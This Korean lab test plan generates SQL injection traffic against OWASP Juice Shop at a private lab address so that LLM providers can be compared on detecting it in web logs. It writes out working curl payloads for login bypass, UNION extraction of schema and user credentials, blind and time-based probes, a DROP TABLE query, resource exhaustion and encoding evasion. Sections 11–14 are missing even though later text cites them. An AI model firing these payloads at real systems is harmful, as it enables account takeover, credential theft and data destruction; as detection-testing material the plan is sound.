# 98B_B세트_통합_비교실험_실행요청

- 작성 기준일: 2026-04-25
- 문서 역할: `docs/98_비교_실험_요청_세트_표준.md`를 따르는 **B세트 통합 실행 문서**
- 적용 범위: Juice Shop 기준 SQL Injection 비교 실험
- 보조 타겟: OpenCart (선택적 corroboration)
- 통합 기준:
  - 운영 안정성과 즉시 실행성은 `98B_B세트_비교실험_실행요청`의 장점을 따른다.
  - 변별력 확대, 난독화·시계열·오탐 회피 축은 `98B_v2_B세트_심화_비교실험_실행요청`의 장점을 선택적으로 반영한다.

이 문서는 **바로 실행 가능한 기본 세트(Core)** 와 **추가 변별력 확인용 심화 세트(Advanced)** 를 한 문서에 함께 둔 통합본이다.

- B세트는 **SQL Injection 전용**이다.
- baseline / auth-only (A세트), XSS (C세트), Traversal / HPP / Dir Probe (D세트)는 본 문서에 섞지 않는다.
- 기본 비교는 Juice Shop 기준으로 수행한다.
- OpenCart는 **선택적 보조 검증 대상**으로만 사용한다.

---

## 0. 통합 방향

이 통합본은 두 문서의 성격 차이를 다음처럼 정리해 반영한다.

- **Core**: 짧은 시간 구간, 해석이 쉬운 요청, 과도한 부하나 파괴 위험이 낮은 요청 중심
- **Advanced**: 난독화, 시계열 체인, 오탐 유도, 플랫폼 차이처럼 provider 변별력을 더 크게 드러내는 요청
- **Optional**: 환경 부담 또는 위험이 있는 요청은 별도 표시하고 1차 라운드에서는 생략 가능

즉, 1차 비교는 Core만으로도 충분히 수행 가능하고, 필요하면 Advanced를 별도 시간 구간으로 이어서 수행한다.

---

## 1. 실험 목적

B세트는 다음을 확인하기 위한 SQL Injection 중심 요청 세트다.

- URL 쿼리스트링과 POST 바디에 포함된 SQL 특수문자(`'`, `--`, `;`, `UNION`, `OR 1=1` 등)의 해석 능력 비교
- SQLi **시도**(파싱 오류·차단)와 **성공**(데이터 유출 정황 또는 인증 우회 성공)의 구분 능력 비교
- DB 에러 메시지가 포함된 500 응답의 위험도 산정 방식 비교
- Blind SQLi(Boolean / Time-based)처럼 응답 내용이 아닌 응답 시간·크기 차이로 드러나는 공격의 탐지 여부 비교
- provider별 stage1 / stage2 결과 차이 비교

추가로 심화 축에서는 아래도 본다.

- **난독화 / Evasion**: URL encoding, mixed case, inline comment, double encoding, whitespace 변형을 provider가 정상화 후 의미까지 해석하는지
- **시계열 문맥 해석**: 다수 500/실패 시도 후 단일 200 성공 흐름을 단일 캠페인으로 묶어 해석하는지
- **오탐 회피력**: 정상적 보안 학습 검색이 SQLi로 오판되는지
- **플랫폼 인식력**: SQLite(Juice Shop)와 MySQL/OpenCart의 차이를 보고서에 반영하는지

이 문서는 요청 세트만 다룬다. 시간 구간 기록, export, pipeline, 산출물 보관, manifest 백업은 상위 표준 문서(`docs/98`)를 따른다.

## 2. 기본 변수

```bash
# Primary target
JUICE_URL="http://192.168.56.105"

# Secondary target (optional corroboration)
OC_URL="http://192.168.56.108"

UA_PREFIX="lab-b-set"
```

모든 요청은 `curl` 기준으로 수행한다.

SQL 특수문자가 많이 포함되므로 반드시 **싱글쿼트(`'...'`)로 감싸고, 쿼리스트링은 `-G --data-urlencode` 조합을 우선 사용**한다. JSON 본문에 싱글쿼트가 들어가는 경우 `'''` 이스케이프 패턴을 사용한다.

타겟 구분:

- **Juice Shop**: 메인 SQLi 비교 실험
- **OpenCart**: 선택적 보조 검증만 수행

## 3. B세트 메타 정의

- `webservice`: `juice-shop` (primary)
- `experiment_set`: `B`
- `attack_category`: `sqli`
- `sqli_subcategory`:
  - Core: `auth_bypass`, `union_based`, `error_based`, `boolean_blind`, `time_blind`
  - Advanced: `evasion`, `temporal_correlation`, `false_positive_bait`, `cross_platform`
- 권장 실행 시간: 라운드당 10~15분 내외의 짧은 시간 구간
- 권장 방식: 시작 시각 기록 → 요청 세트 실행 → 종료 시각 기록 → `--start / --end` export

provider 비교 시 공통 조건:

- 같은 raw log
- 같은 `known_asset_ips`
- 같은 top-N
- 같은 `mode`
- 같은 `config/llm.env`를 한 번만 적용
- provider는 각 실행마다 CLI에서 명시

중요 메모:

- 본 문서의 “기대 verdict / severity”는 **실제 stage1 라벨명을 확정하는 의미가 아니라 기대 해석 방향**이다.
- 결과 문서에는 **실제 모델 출력 라벨명**과 **운영자가 해석한 의미**를 구분해 기록한다.

## 4. 실행 전략

### 4.1 권장 라운드 구성

#### Round 1 — Core B1 (필수)
- 5절 Auth Bypass
- 6절 Union-based
- 7절 Error-based

#### Round 2 — Core B2 (권장)
- 8절 Boolean Blind / Time-based

#### Round 3 — Advanced BX (선택)
- 9절 Evasion
- 10절 Temporal Correlation
- 11절 False Positive Bait
- 12절 Cross-platform Corroboration

### 4.2 운영 권장

- 처음 비교는 **Core B1 → Core B2** 순서만으로도 충분하다.
- Advanced BX는 Core 결과를 보고 추가한다.
- 각 라운드는 **별도 raw export / 별도 pipeline / 별도 base-name** 으로 관리하는 것을 권장한다.
- Blind / Time-based 요청은 export window에 마지막 요청 시각 + 여유를 반드시 포함한다.
- `B-04`, `B-17`은 **optional**이며 1차 라운드에서는 생략 가능하다.

## 5. Core — Auth Bypass SQLi 세트

Juice Shop `/rest/user/login` 대상.

### B-01 Classic OR 1=1 Bypass

```bash
curl -i \
  -A "${UA_PREFIX}-auth-or1eq1-1" \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1 --","password":"x"}' \
  "$JUICE_URL/rest/user/login"
```

- 기대 해석 방향: SQLi 인증 우회 시도
- 관찰 포인트: `OR 1=1`, quote termination 패턴을 구체적으로 잡는지

### B-02 Comment Terminator Bypass

```bash
curl -i \
  -A "${UA_PREFIX}-auth-comment-1" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' \
  "$JUICE_URL/rest/user/login"
```

- 기대 해석 방향: **인증 우회 성공 정황으로 강하게 승격 기대**
- 관찰 포인트:
  - 200 응답을 성공 정황으로 승격하는지
  - `response_body_bytes`, `resp_content_type`, token 구조를 정량 근거로 인용하는지

### B-03 UNION-based Auth Bypass

```bash
curl -i \
  -A "${UA_PREFIX}-auth-union-1" \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' UNION SELECT 1,2,3,4,5,6,7 --","password":"x"}' \
  "$JUICE_URL/rest/user/login"
```

- 기대 해석 방향: UNION 기반 인증 우회 시도
- 관찰 포인트: UNION 키워드와 컬럼 개수 추정 흐름을 인식하는지

### B-04 Stacked Query Attempt (**optional**)

```bash
curl -i \
  -A "${UA_PREFIX}-auth-stacked-1" \
  -H "Content-Type: application/json" \
  -d '{"email":"x'\''; DROP TABLE Users; --","password":"x"}' \
  "$JUICE_URL/rest/user/login"
```

- 기대 해석 방향: stacked query + destructive intent
- 관찰 포인트: `DROP TABLE`을 단순 SQLi가 아니라 파괴 의도로 서술하는지
- 운영 메모: 1차 비교에서는 생략 가능. 실행 시 격리 환경, 스냅샷, 복구 절차를 먼저 준비한다.

## 6. Core — Union-based SQLi 세트 (데이터 추출)

Juice Shop `/rest/products/search?q=...` 대상.

### B-05 Union Column Count Probe (NULL padding)

```bash
curl -i -G \
  -A "${UA_PREFIX}-union-count-1" \
  --data-urlencode "q=x')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: 컬럼 수 확인용 정찰
- 관찰 포인트: UNION + NULL padding을 reconnaissance 단계로 서술하는지

### B-06 Union Schema Extraction (sqlite_master)

```bash
curl -i -G \
  -A "${UA_PREFIX}-union-schema-1" \
  --data-urlencode "q=x')) UNION SELECT 1,name,sql,4,5,6,7,8,9 FROM sqlite_master --" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: **스키마/메타데이터 유출 성공 정황**
- 관찰 포인트:
  - `sqlite_master`를 SQLite 메타데이터 탈취로 명시하는지
  - 200 + JSON + 응답 크기 증가를 성공 근거로 쓰는지

### B-07 Union Credential Extraction

```bash
curl -i -G \
  -A "${UA_PREFIX}-union-creds-1" \
  --data-urlencode "q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users --" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: **자격증명 유출 성공 정황**
- 관찰 포인트:
  - `Users`, `email`, `password` 조합을 고위험 유출로 서술하는지
  - 권고 조치가 강하게 나오는지
- 운영 메모: Core B1의 **가장 마지막**에 실행 권장

## 7. Core — Error-based SQLi 세트

### B-08 Quote Termination Error

```bash
curl -i -G \
  -A "${UA_PREFIX}-err-quote-1" \
  --data-urlencode "q=apple'" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: SQL 구문 오류 유도
- 관찰 포인트: 단순 입력 오류가 아니라 SQLi 시도로 해석하는지

### B-09 Parenthesis Breakout Error

```bash
curl -i -G \
  -A "${UA_PREFIX}-err-parens-1" \
  --data-urlencode "q=apple'))" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: 쿼리 구조 추정용 정찰
- 관찰 포인트: `))` 조합을 의도적 breakout 시도로 보는지

### B-10 Type Mismatch in Path

```bash
curl -i \
  -A "${UA_PREFIX}-err-type-1" \
  "$JUICE_URL/rest/products/1'"
```

- 기대 해석 방향: path 기반 입력 오염 / SQLi 시도 정황
- 관찰 포인트: SQLi와 단순 라우팅 오류 가능성을 균형 있게 병기하는지

### B-11 DB Engine Fingerprint via CAST Error

```bash
curl -i -G \
  -A "${UA_PREFIX}-err-cast-1" \
  --data-urlencode "q=x')) UNION SELECT CAST('a' AS INTEGER),2,3,4,5,6,7,8,9 --" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: CAST 실패를 통한 DB 엔진 식별 시도
- 관찰 포인트: `SQLITE_ERROR` 등 엔진 정보 노출을 정보 유출로 다루는지

## 8. Core — Blind / Time-based SQLi 세트

### B-12 Boolean Blind TRUE

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-bool-true-1" \
  --data-urlencode "q=apple' AND '1'='1" \
  "$JUICE_URL/rest/products/search"
```

### B-13 Boolean Blind FALSE

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-bool-false-1" \
  --data-urlencode "q=apple' AND '1'='2" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: Boolean Blind SQLi TRUE/FALSE 쌍
- 관찰 포인트:
  - 두 요청을 **쌍(pair)** 으로 묶는지
  - `response_body_bytes` 차이를 정량 근거로 인용하는지

### B-14 Substring Credential Inference

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-substr-1" \
  --data-urlencode "q=apple' AND substr((SELECT email FROM Users LIMIT 1),1,1)='a" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: blind 기반 정보 추론 시도
- 관찰 포인트: `substr(...)` + `SELECT ... FROM Users`를 자격증명 추론으로 서술하는지

### B-15 Time-based Baseline

```bash
curl -i -G \
  -A "${UA_PREFIX}-time-base-1" \
  --data-urlencode "q=apple' AND 1=1" \
  "$JUICE_URL/rest/products/search"
```

### B-16 Time-based Heavy Cartesian Delay

```bash
curl -i --max-time 60 -G \
  -A "${UA_PREFIX}-time-cartesian-1" \
  --data-urlencode "q=apple' AND 1=(SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3,sqlite_master t4)" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: time-based SQLi 시도
- 관찰 포인트:
  - `duration_us`, `ttfb_us` 차이를 정량 근거로 인용하는지
  - baseline(B-15)과 지연 요청(B-16)을 함께 해석하는지

### B-17 randomblob Delay (**optional**)

```bash
curl -i --max-time 90 -G \
  -A "${UA_PREFIX}-time-blob-1" \
  --data-urlencode "q=apple' AND 'a' LIKE 'a%' AND (SELECT hex(randomblob(100000000)))='x" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: time-based SQLi + DoS-adjacent 자원 소진 의도
- 관찰 포인트: `randomblob()` 를 단순 지연이 아니라 자원 소진 의도로도 보는지
- 운영 메모: 1차 비교에서는 생략 권장

## 9. Advanced — Evasion / 난독화 SQLi 세트 (선택)

### B-18 URL-encoded Quote

```bash
curl -i \
  -A "${UA_PREFIX}-evade-urlenc-1" \
  "$JUICE_URL/rest/products/search?q=apple%27%20OR%20%271%27%3D%271%20%2D%2D"
```

- 기대 해석 방향: URL-encoded payload를 디코드 후 SQLi로 해석
- 관찰 포인트: 정규화 필드가 의미를 보존하는지

### B-19 Mixed Case UNION

```bash
curl -i -G \
  -A "${UA_PREFIX}-evade-mixedcase-1" \
  --data-urlencode "q=x')) uNiOn SeLeCt 1,2,3,4,5,6,7,8,9 --" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: mixed case를 정상 UNION과 동등하게 처리
- 관찰 포인트: WAF 회피 의도까지 서술하는지

### B-20 Inline Comment Splitting

```bash
curl -i -G \
  -A "${UA_PREFIX}-evade-inline-comment-1" \
  --data-urlencode "q=x'/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9/**/--" \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: 인라인 주석 기반 우회
- 관찰 포인트: `/**/` 를 토큰 분리 회피 기법으로 인식하는지

### B-21 Double URL Encoding

```bash
curl -i \
  -A "${UA_PREFIX}-evade-double-enc-1" \
  "$JUICE_URL/rest/products/search?q=apple%2527%2520OR%25201%253D1%2520--"
```

- 기대 해석 방향: 이중 인코딩 기반 회피 의도
- 관찰 포인트: 실행 성공 여부보다 회피 의도 자체를 잡는지

### B-22 Whitespace Replacement

```bash
curl -i -G \
  -A "${UA_PREFIX}-evade-whitespace-1" \
  --data-urlencode $'q=x\')) UNION\tSELECT\t1,2,3,4,5,6,7,8,9\n--' \
  "$JUICE_URL/rest/products/search"
```

- 기대 해석 방향: 탭/개행 기반 공백 우회
- 관찰 포인트: 공백 정규화 후 UNION SELECT 의미를 유지하는지

## 10. Advanced — Temporal Correlation 세트 (선택)

### B-23 Multi-attempt → Single Success Chain

다음 흐름을 **짧은 시간 안에 연속 실행**한다.

```bash
curl -i -G -A "${UA_PREFIX}-chain-step-01" --data-urlencode "q=apple'" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-02" --data-urlencode "q=apple''" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-03" --data-urlencode "q=apple')" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-04" --data-urlencode "q=apple'))" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-05" --data-urlencode "q=x')) UNION SELECT 1 --" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-06" --data-urlencode "q=x')) UNION SELECT 1,2,3 --" "$JUICE_URL/rest/products/search"
sleep 2
curl -i -G -A "${UA_PREFIX}-chain-step-07" --data-urlencode "q=x')) UNION SELECT 1,2,3,4,5 --" "$JUICE_URL/rest/products/search"
sleep 2
```

## 15. 주의사항

- 본 문서는 SQL Injection 전용 통합본이다.
- 모든 요청은 테스트 승인된 Juice Shop / OpenCart 환경에서만 수행한다. **외부 시스템 대상 금지**.
- `B-04`, `B-17`은 1차 라운드에서 제외 권장이다.
- `B-07`은 강한 유출 정황이므로 Core B1의 마지막에 둔다.
- Blind / Time-based / Chain 요청은 export window에 여유를 둔다.
- `B-24`, `B-25`는 오탐 회피력 측정용이므로 별도 표시가 가능하게 UA를 유지한다.
- stage2 보고서는 사건 요약 보고서이므로 `request_id` 기준 raw evidence와 함께 확인한다.
- 성공한 유출로 해석된 요청은 `response_body_bytes`, `resp_content_type`, `raw_log` 일부를 반드시 수동 대조한다.
- known_asset 문맥이 있더라도 B세트는 payload 공격성이 직접적이므로, provider가 공격성 해석을 과도하게 약화시키는지 따로 본다.
- 실험 날짜와 파일명은 실제 수행 후 사후 기입한다.

## 16. 실험 해석 주의

2026-04-25 Round 1 결과를 해석할 때는 B세트 전체를 동일 강도로 읽지 않는다. 이번 구간의 raw export에는 아래 요청이 실제로 존재했다.

- `B-01`: `POST /rest/user/login` | `200` | `application/json` | `799 bytes`
- `B-02`: `POST /rest/user/login` | `200` | `application/json` | `799 bytes`

같은 구간의 raw export 총 10건 중 prepare 후보는 7건만 남았고 3건은 filtered out 되었다. request_id 기준으로 보면 filtered out 3건에는 `B-01`, `B-02`, 그리고 `GET /rest/products/1'` 500 한 건이 포함된다.

따라서 이번 Round 1의 최종 해석은 사실상 `/rest/products/search` 중심 SQLi 비교로 읽는 것이 정확하다. OpenAI와 Anthropic의 stage2 보고서도 최종적으로는 search API 대상 `UNION SELECT`, `sqlite_master`, `Users`, 오류 유발형 요청을 중심으로 수렴했다.

이 점은 `B-01`/`B-02`가 중요하지 않다는 뜻이 아니다. 현재 baseline 구조에서는 공격 신호가 POST JSON body 내부에만 있고 Apache 공통/security 로그 표면에는 `200 application/json` 정상형 응답만 남는 auth bypass 성공형 요청이 candidate 구성 단계에서 누락될 수 있다는 실례로 읽는 것이 맞다.

즉 이번 Round 1 결과는 "모델이 auth bypass를 놓쳤다"기보다, 현재 파이프라인이 Apache 공통/security 로그에 직접 드러나는 SQLi 신호에는 강하지만 body-only auth bypass 성공형 요청에는 blind spot이 있을 수 있음을 보여준다.
